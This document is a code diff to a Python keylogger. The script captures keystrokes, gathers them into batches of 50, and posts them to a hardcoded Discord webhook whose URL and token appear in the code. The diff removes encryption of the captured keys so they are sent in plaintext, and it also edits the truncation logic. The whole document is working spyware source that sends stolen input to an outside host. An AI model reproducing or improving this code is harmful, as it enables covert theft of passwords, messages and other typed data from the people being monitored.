@@ -24,9 +24,6 @@ else:
 # Discord Webhook URL
 discord_webhook_url = "https://discord.com/api/webhooks/1311116235433574492/frXUQT2FN8NbTvzA5TCiZ2Moc_QLS56xT49_SaxZbwS-XfmDv815jOGYC3ozovFsuZsX"
 
-# File to store logged keystrokes temporarily
-log_file = "key_log.txt"
-
 # Buffer to collect keystrokes
 keystroke_buffer = []
 BUFFER_SIZE = 50  # Send message when 50 keystrokes are collected
@@ -46,8 +43,6 @@ def send_to_discord():
 
                 # Truncate to Discord's max message size if needed
                 if len(message_content) > 2000:
-                    message_content = message_content[:1997] + "..."
-                elif len(message_content) < 20000:
                     message_content = message_content[:1997] + "..."
 
                 # Send to Discord
@@ -70,11 +65,15 @@ def on_press(key):
     """Log each keystroke and add it to the buffer."""
     try:
         if hasattr(key, 'char') and key.char is not None:
-            keystroke = cipher.encrypt(key.char.encode())
+            keystroke = key.char  # Character keys
         else:
-            keystroke = cipher.encrypt(f"[{key}]".encode())
+            keystroke = f"[{key}]"  # Special keys (e.g., [Shift], [Ctrl])
 
-        keystroke_buffer.append(keystroke.decode(errors="ignore"))
+        # Decode to string if bytes and append to buffer
+        if isinstance(keystroke, bytes):
+            keystroke_buffer.append(keystroke.decode(errors="ignore"))
+        else:
+            keystroke_buffer.append(keystroke)
     except Exception as e:
         print(f"Error logging key press: {e}")
 
